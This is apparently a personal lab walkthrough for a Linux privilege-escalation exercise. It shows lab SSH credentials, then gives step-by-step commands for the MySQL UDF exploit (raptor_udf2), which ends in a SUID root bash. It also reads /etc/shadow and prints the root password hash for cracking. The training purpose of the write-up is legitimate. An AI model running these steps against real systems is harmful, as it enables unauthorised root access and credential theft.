# Linux Privilege Escalation

`ssh user@10.10.168.144 -p 22`

Password is **password321**

Upon running the `id` command.

```ad-success
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

---

## Service Exploits

MySQL service is running as root and the root user does not have a password assigned for that service. 

Running MYSQL with root is very bad idea since he/she can pretty much do anything, create a fake account, delete, drop the database, and more.

It is important to split the privileges, one can perform CRUD, and the other can perform the backup or view local table and such.

In this case we found that MYSQL is running root as a user and setted no password.

Answer [here](https://stackoverflow.com/questions/11059493/good-security-in-mysql-web-application-root-not-root).

We can use popular exploit for User Defined Functions [here](https://www.exploit-db.com/exploits/1518).

---

After gaining access we can download the exploit.

In this case
`cd /home/user/tools/mysql-udf`

Compiling the raptor_udf2.c
`gcc -g -c raptor_udf2.c -fPIC   
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc``

After compiling, connect to MYSQL
`mysql -u root`

Execute MYSQL command to create UDF exploit.
`use mysql;   
`create table foo(line blob); `  
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`

`select * from foo into dumpfile'/usr/lib/mysql/plugin/raptor_udf2.so';`   

`create function do_system returns integer soname 'raptor_udf2.so';``

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit MYSQL and run rootbash to open a shell that has root privileges.
`/tmp/rootbash -p`

![[Pasted image 20220726194641.png]]

---

## Weak FIle Permissionns - Readable /etc/shadow

**/etc/shadow** usualyl contains user password hashes and is usually readable only by the root user.

After usign `cat /etc/shadow`.
![[Pasted image 20220726195804.png]]

Each line represents a user and in between the first and the second colons is the user's password hash.

Root's hash
**$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0**

Saved root's hash into **hash1.txt**


